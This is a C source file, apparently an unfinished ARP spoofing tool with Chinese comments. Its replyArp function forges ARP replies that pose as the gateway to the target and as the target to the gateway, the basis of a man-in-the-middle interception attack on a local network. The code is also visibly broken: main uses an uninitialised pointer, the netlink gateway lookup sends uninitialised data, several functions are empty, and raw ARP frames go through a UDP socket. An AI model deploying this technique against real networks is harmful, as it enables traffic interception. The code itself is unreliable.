#include <getopt.h>
#include <stdlib.h>
#include <stdio.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <string.h>
#include <ifaddrs.h>
#include <linux/rtnetlink.h>

#define IPLEN 4
struct opts
{
	char *argv_i;
	char *argv_a;
	int sock_fd;
	unsigned int self_ip;
	unsigned char self_mac[6];
	unsigned int gateway_ip;
	unsigned char gateway_mac[6];
	unsigned int target_ip;
	unsigned char target_mac[6];
};
struct arp_packet
{
	short hwd_type;
	short proto_type;
	char mac_len;
	char ip_len;
	short op;
	char sender_mac[6];
	int sender_ip;
	char target_mac[6];
	int target_ip;
};
void getGatewayAddr(struct opts *options)
{
	struct ifaddrs *data, *item;
	getifaddrs(&data);
	item = data;
	do
	{

		if (strcmp(options->argv_i, item->ifa_name) == 0 && item->ifa_addr->sa_family == AF_INET)
		{
			break;
		}

	} while (item = item->ifa_next);
	 struct rtattr a;
	 int s = socket(AF_NETLINK,SOCK_RAW,NETLINK_ROUTE);
	 struct nlmsghdr *nlmsg;
	 int c = send(s, nlmsg, sizeof(nlmsg), 0);
	// memcpy((void *)&options->gateway_ip, (void *)item->ifa_addr + 4, IPLEN);
}
void getTargetAddr(struct opts *options)
{
}
void getSelfAddr(struct opts *options)
{
	// 取得自己的mac、ip
	struct ifreq ifr;
	memset((void *)&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, options->argv_i, sizeof(ifr.ifr_name));
	ioctl(options->sock_fd, SIOCADDRT, &ifr);
	if (ioctl(options->sock_fd, SIOCGIFADDR, &ifr) == -1)
	{
		printf("ioctl error\n");
		exit(EXIT_FAILURE);
	}
	memcpy((void *)&options->self_ip, (void *)&ifr.ifr_addr + 4, IPLEN); // 放棄前4 byte(sa_family、sin_port)
	if (ioctl(options->sock_fd, SIOCGIFHWADDR, &ifr) == -1)
	{
		printf("ioctl error\n");
		exit(EXIT_FAILURE);
	}
	memcpy((void *)&options->self_mac, (void *)&ifr.ifr_hwaddr + 2, ETH_ALEN);
}
void replyArp(int isTarget, struct opts *options)
{
	struct arp_packet req;
	req.hwd_type = htons(ETH_P_802_3); // 乙太
	req.proto_type = htons(ETH_P_IP);  // 基於ipv4 協議傳送
	req.mac_len = ETH_ALEN;			   // 乙太mac 地址長度 小於2byte 不用htons
	req.ip_len = IPLEN;				   // ipv4地址長度 小於2byte 不用htons
	req.op = htons(ARPOP_REPLY);
	if (isTarget)
	{
		memcpy((void *)&req.sender_mac, (void *)&options->self_mac, ETH_ALEN);
		memcpy((void *)&req.sender_ip, (void *)&options->gateway_ip, IPLEN);
		memcpy((void *)&req.target_mac, (void *)&options->target_mac, ETH_ALEN);
		memcpy((void *)&req.target_ip, (void *)&options->target_ip, IPLEN);
	}
	else
	{
		memcpy((void *)&req.sender_mac, (void *)&options->self_mac, ETH_ALEN);
		memcpy((void *)&req.sender_ip, (void *)&options->target_ip, IPLEN);
		memcpy((void *)&req.target_mac, (void *)&options->gateway_mac, ETH_ALEN);
		memcpy((void *)&req.target_ip, (void *)&options->gateway_ip, IPLEN);
	}

	struct sockaddr self_socket_addr;
	self_socket_addr.sa_family = 1;
	strncpy(self_socket_addr.sa_data, options->self_mac, sizeof(ETH_ALEN));
	int code = sendto(options->sock_fd, (void *)&req, sizeof(req), 0, &self_socket_addr, sizeof(struct sockaddr));
	if (code < 0)
	{
		printf("send arp error\n");
	}
}
void reqArp(unsigned int ip, struct opts *options)
{
}
void getArgv(int argc, char *argv[], struct opts *options)
{
	while (1)
	{
		int opt = getopt(argc, argv, "i:a:");
		if (opt == -1)
		{
			break;
		}

		switch (opt)
		{
		case 'i':
			options->argv_i = optarg;
			break;
		case 'a':
			options->argv_a = optarg;
			options->target_ip = inet_addr(optarg);
			break;

		default:
			printf("arguments error;args: -i interface, -a target ip\n");
			exit(EXIT_FAILURE);
			break;
		}
	}
	// domain AF_INET tcp/upd
	// type udp
	options->sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (options->sock_fd == -1)
	{

		printf("socket error\n");
		exit(EXIT_FAILURE);
	}

	getSelfAddr(options);
	getGatewayAddr(options);
	getTargetAddr(options);
}

int main(int argc, char *argv[])
{
	struct opts *options;
	memset((void *)options, 0, sizeof(options));
	getArgv(argc, argv, options);
	replyArp(0, options);
	replyArp(1, options);

	return EXIT_SUCCESS;
}